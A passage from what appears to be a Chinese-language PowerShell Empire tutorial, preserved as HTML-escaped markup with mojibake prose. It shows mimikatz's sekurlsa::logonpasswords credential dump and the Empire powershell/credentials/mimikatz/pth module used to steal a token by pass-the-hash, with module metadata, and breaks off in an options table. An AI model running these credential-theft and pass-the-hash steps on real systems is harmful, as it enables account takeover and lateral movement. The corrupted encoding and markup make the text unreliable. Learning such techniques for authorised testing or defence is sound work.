&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;c1&#34;&gt;## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;c1&#34;&gt;## \ / ##       &amp;gt; https://blog.gentilkiwi.com/mimikatz&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;## v ##&amp;#39;&lt;/span&gt;       Vincent LE TOUX             &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; vincent.letoux@gmail.com &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s1&#34;&gt;&amp;#39;#####&amp;#39;&lt;/span&gt;        &amp;gt; https://pingcastle.com / https://mysmartlogon.com ***/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;powershell&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# sekurlsa::logonpasswords&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Authentication Id : &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404157&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;00000000:00062abd&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Session           : RemoteInteractive from &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;....
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;....
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;....
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è·å–å®Œæ¯•æˆ‘ä»¬å¯ä»¥åœ¨&lt;code&gt;credentials&lt;/code&gt;ä¸­çœ‹åˆ°åˆ—ä¸¾å‡ºçš„å¯†å‡­è¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//14.png&#34; alt=&#34;14&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä½¿ç”¨pthæ¨¡å—è¿›è¡Œçªƒå–ä»¤ç‰Œ,è®¾ç½®&lt;code&gt;CredID&lt;/code&gt;å°±æ˜¯åˆšæ‰å‡­è¯åˆ—è¡¨çš„IDï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Empire&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SU3EWKV&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;usemodule&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;credentials&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mimikatz&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pth&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;Set&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Agent&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SU3EWKV&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Author&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;JosephBialek&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                                                        
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gentilkiwi&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                                                          
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Background&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                                                                 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Comments&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;clymb3r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordpress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                                        
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;blog&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gentilkiwi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                                           
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;blog&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cobaltstrike&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2015&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;05&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;how&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;the&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hash&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;with&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mimikatz&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                                                            
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Description&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Runs&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PowerSploit&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;s Invoke-Mimikatz function to execute sekurlsa::pth 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;              to create a new process. with a specific user&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;Use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;            
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;credentials&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tokens&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;steal&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;the&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;token&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;afterwards&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                    
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Language&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                                                           
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;credentials&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mimikatz&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pth&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                                  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NeedsAdmin&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                                                                 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;OpsecSafe&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                                                                 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Software&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;attack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mitre&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;software&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;S0002&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                               
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Techniques&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;attack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mitre&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;techniques&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T1098&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                             
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;attack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mitre&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;techniques&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T1003&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                             
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;attack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mitre&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;techniques&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T1081&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                             
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;attack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mitre&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;techniques&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T1207&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                             
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;attack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mitre&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;techniques&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T1075&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                             
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;attack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mitre&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;techniques&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T1097&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                             
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;attack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mitre&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;techniques&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T1145&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                             
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;attack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mitre&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;techniques&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T1101&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                             
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;attack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mitre&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;techniques&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T1178&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                             
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”Œ&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Record&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Options&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Value&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Required&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Description&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                      &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;â”‚&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
